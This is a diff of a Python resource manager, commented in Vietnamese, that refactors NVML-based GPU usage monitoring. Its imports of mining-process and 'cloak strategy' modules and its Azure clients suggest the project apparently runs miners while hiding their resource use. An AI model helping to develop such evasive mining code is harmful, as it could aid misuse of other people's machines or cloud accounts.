@@ -1,5 +1,3 @@
-# resource_manager.py
-
 import os
 import logging
 import psutil
@@ -13,13 +11,11 @@ from itertools import count
 from contextlib import asynccontextmanager
 from threading import Lock  # Giữ lại Lock cho Singleton
 
-
-
-#from readerwriterlock import rwlock
+import aiofiles  # Thêm aiofiles để xử lý I/O bất đồng bộ
 
 # Import các module phụ trợ từ dự án
 from .base_manager import BaseManager
-from .utils import MiningProcess, GPUManager
+from .utils import MiningProcess  # Bỏ GPUManager
 from .cloak_strategies import CloakStrategy, CloakStrategyFactory
 from .resource_control import ResourceControlFactory  # Import ResourceControlFactory
 
@@ -44,12 +40,12 @@ from .auxiliary_modules.power_management import (
     shutdown_power_management
 )
 
-import aiofiles  # Thêm aiofiles để xử lý I/O bất đồng bộ
+
+
 
 ###############################################################################
 #                     BỔ SUNG: EVENT-DRIVEN & WATCHER MODULE                  #
 ###############################################################################
-
 
 @asynccontextmanager
 async def acquire_lock_with_timeout(lock: aiorwlock.RWLock, lock_type: str, timeout: float):
@@ -90,36 +86,62 @@ class SharedResourceManager:
     """
     Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...).
     Tích hợp với ResourceControlFactory để quản lý resource managers.
+    
+    Bắt đầu từ phiên bản này, thay thế hoàn toàn GPUManager bằng cách
+    tự khởi tạo và quản lý vòng đời của pynvml.
     """
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, gpu_manager: GPUManager, resource_managers: Dict[str, Any]):
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_managers: Dict[str, Any]):
         """
         Khởi tạo SharedResourceManager với cấu hình, logger và resource_managers.
+        
+        Thay đổi chính:
+          - Không còn sử dụng GPUManager. 
+          - Quản lý pynvml độc lập, lưu trạng thái khởi tạo trong biến `_nvml_init`.
         """
         self.config = config
         self.logger = logger
-        self.gpu_manager = gpu_manager
         self.resource_managers = resource_managers
         self.power_manager = PowerManager()
         self.strategy_cache = {}  # Cache cho các chiến lược cloaking
 
-    def is_gpu_initialized(self) -> bool:
+        # Trạng thái khởi tạo NVML
+        self._nvml_init = False
+
+    def is_nvml_initialized(self) -> bool:
         """
-        Kiểm tra xem GPU đã được khởi tạo hay chưa.
+        Kiểm tra xem pynvml đã được khởi tạo (NVMLInit) hay chưa.
         """
-        self.logger.debug(
-            f"Checking GPU initialization: {self.gpu_manager.gpu_initialized}"
-        )
-        return self.gpu_manager.gpu_initialized
+        return self._nvml_init
+
+    def initialize_nvml(self):
+        """
+        Khởi tạo pynvml (NVML) nếu chưa được khởi tạo.
+        """
+        if not self._nvml_init:
+            try:
+                pynvml.nvmlInit()
+                self._nvml_init = True
+                self.logger.debug("Đã khởi tạo NVML thành công.")
+            except pynvml.NVMLError as e:
+                self.logger.error(f"Lỗi khi khởi tạo NVML: {e}")
+                self._nvml_init = False
 
     async def shutdown_nvml(self):
         """
-        Đóng NVML khi không cần thiết (gọi khi shutdown toàn bộ).
+        Đóng NVML khi không còn cần nữa (gọi khi shutdown toàn bộ).
         """
-        self.gpu_manager.shutdown_nvml()
+        if self._nvml_init:
+            try:
+                pynvml.nvmlShutdown()
+                self._nvml_init = False
+                self.logger.debug("Đã shutdown NVML thành công.")
+            except pynvml.NVMLError as e:
+                self.logger.error(f"Lỗi khi shutdown NVML: {e}")
 
     ##########################################################################
     #                 HÀM HỖ TRỢ LẤY THÔNG TIN USAGE ASYNC                  #
     ##########################################################################
+    
     async def get_process_cache_usage(self, pid: int) -> float:
         """
         Lấy usage cache của tiến trình từ /proc/[pid]/status (bất đồng bộ).
@@ -157,9 +179,17 @@ class SharedResourceManager:
     def _sync_get_gpu_usage_percent(self, pid: int) -> float:
         """
         Phương thức đồng bộ để lấy GPU usage, gọi từ async context.
+        - Thay đổi: Sử dụng logic NVMLInit 1 lần, không shutdown NVML tại đây.
         """
         try:
-            pynvml.nvmlInit()
+            # Đảm bảo NVML đã được khởi tạo
+            if not self.is_nvml_initialized():
+                self.initialize_nvml()
+
+            if not self._nvml_init:
+                # Nếu init thất bại, trả về 0
+                return 0.0
+
             device_count = pynvml.nvmlDeviceGetCount()
             total_gpu_usage = 0.0
             gpu_present = False
@@ -172,8 +202,8 @@ class SharedResourceManager:
                         gpu_present = True
                         utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                         total_gpu_usage += utilization.gpu
-            pynvml.nvmlShutdown()
 
+            # KHÔNG shutdown NVML, để dành cho hàm shutdown_nvml() khi tắt toàn bộ
             if gpu_present:
                 return total_gpu_usage
             else:
@@ -258,11 +288,9 @@ class SharedResourceManager:
             )
             raise
 
-
 ###############################################################################
 #                      LỚP CHÍNH: ResourceManager (SINGLETON)                 #
 ###############################################################################
-
 
 class ResourceManager(BaseManager, IResourceManager):
     """
@@ -280,9 +308,12 @@ class ResourceManager(BaseManager, IResourceManager):
                 cls._instance = super().__new__(cls)
         return cls._instance
 
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_managers: Dict[str, Any], gpu_manager: Optional[GPUManager] = None):
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_managers: Dict[str, Any]):
         """
-        Khởi tạo ResourceManager với các thành phần tài nguyên và GPUManager.
+        Khởi tạo ResourceManager với các thành phần tài nguyên.
+        
+        - Bỏ tham số `gpu_manager` (nếu có) để loại bỏ phụ thuộc GPUManager.
+        - Giữ nguyên các logic khác.
         """
         BaseManager.__init__(self, config, logger)
         if getattr(self, '_initialized', False):
@@ -292,7 +323,6 @@ class ResourceManager(BaseManager, IResourceManager):
         self.config = config
         self.logger = logger
         self.resource_managers = resource_managers
-        self.gpu_manager = gpu_manager  # Lưu GPUManager nếu được cung cấp
 
         # Các thuộc tính khác
         self.stop_event = Event()
@@ -304,22 +334,21 @@ class ResourceManager(BaseManager, IResourceManager):
         self._counter = count()
         self.watchers = []
 
+        # Sẽ khởi tạo SharedResourceManager sau trong hàm start()
+        self.shared_resource_manager = None
 
     ##########################################################################
     #             KHỞI TẠO/SHUTDOWN & AZURE CLIENT LIÊN QUAN                 #
     ##########################################################################
 
-
     async def is_gpu_initialized(self) -> bool:
         """
-        Override phương thức trừu tượng trong IResourceManager.
+        Giữ lại tên hàm is_gpu_initialized() cho tương thích, 
+        nhưng thực chất kiểm tra xem NVML đã init hay chưa.
         """
-        try:
-            return self.shared_resource_manager.is_gpu_initialized()
-        except Exception as e:
-            self.logger.error(f"Lỗi khi kiểm tra GPU initialization: {e}\n{traceback.format_exc()}")
-            return False
-        
+        if self.shared_resource_manager:
+            return self.shared_resource_manager.is_nvml_initialized()
+        return False
 
     async def restore_resources(self, process: MiningProcess) -> bool:
         """
@@ -330,7 +359,6 @@ class ResourceManager(BaseManager, IResourceManager):
         except Exception as e:
             self.logger.error(f"Lỗi trong restore_resources cho PID={process.pid}: {e}\n{traceback.format_exc()}")
             return False
-
 
     def initialize_azure_clients(self):
         """
@@ -461,7 +489,8 @@ class ResourceManager(BaseManager, IResourceManager):
             cpu_pct = p_obj.cpu_percent(interval=1)
             mem_mb = p_obj.memory_info().rss / (1024**2)
 
-            if self.shared_resource_manager.is_gpu_initialized():
+            # Thay vì GPUManager, ta kiểm tra NVML đã init hay chưa
+            if await self.is_gpu_initialized():
                 gpu_pct = await self.shared_resource_manager.get_gpu_usage_percent(process.pid)
             else:
                 gpu_pct = 0.0
@@ -620,7 +649,7 @@ class ResourceManager(BaseManager, IResourceManager):
             cpu_temp = await asyncio.get_event_loop().run_in_executor(None, temperature_monitor.get_cpu_temperature, process.pid)
             gpu_temps = None
 
-            if self.shared_resource_manager.is_gpu_initialized():
+            if await self.is_gpu_initialized():
                 gpu_temps = await asyncio.get_event_loop().run_in_executor(None, temperature_monitor.get_gpu_temperature, process.pid)
 
             # Nếu CPU temp vượt ngưỡng => enqueue
@@ -674,7 +703,7 @@ class ResourceManager(BaseManager, IResourceManager):
             c_power = await asyncio.get_event_loop().run_in_executor(None, get_cpu_power, process.pid)
             g_power = 0.0
 
-            if self.shared_resource_manager.is_gpu_initialized():
+            if await self.is_gpu_initialized():
                 g_power = await asyncio.get_event_loop().run_in_executor(None, get_gpu_power, process.pid)
 
             if c_power > cpu_max_power:
@@ -727,7 +756,8 @@ class ResourceManager(BaseManager, IResourceManager):
 
         # Chờ queue rỗng, sau đó mới shutdown NVML
         await asyncio.sleep(1)
-        await self.shared_resource_manager.shutdown_nvml()
+        if self.shared_resource_manager:
+            await self.shared_resource_manager.shutdown_nvml()
 
         # Khôi phục tài nguyên cho tất cả tiến trình (nếu cần)
         tasks = []
@@ -740,7 +770,7 @@ class ResourceManager(BaseManager, IResourceManager):
         self.logger.info("ResourceManager đã dừng.")
 
     ##########################################################################
-    #                           PHƯƠNG THỨC start()                         #
+    #                           PHƯƠNG THỨC start()                          #
     ##########################################################################
 
     async def start(self):
@@ -750,21 +780,13 @@ class ResourceManager(BaseManager, IResourceManager):
         self.logger.info("Bắt đầu khởi động ResourceManager...")
 
         try:
-            # Khởi tạo GPUManager
-            self.gpu_manager = GPUManager()
-            initialized = await self.gpu_manager.initialize()
-            if not initialized:
-                self.logger.warning("GPUManager không được khởi tạo - vô hiệu hoá tính năng GPU.")
-
-            # Tạo các resource managers
+            # Tạo các resource managers (không cần GPUManager)
             resource_managers = await ResourceControlFactory.create_resource_managers(
-                logger=self.logger,
-                gpu_manager=self.gpu_manager,
+                logger=self.logger
             )
             self.shared_resource_manager = SharedResourceManager(
                 self.config,
                 self.logger,
-                gpu_manager=self.gpu_manager,
                 resource_managers=resource_managers,
             )
 
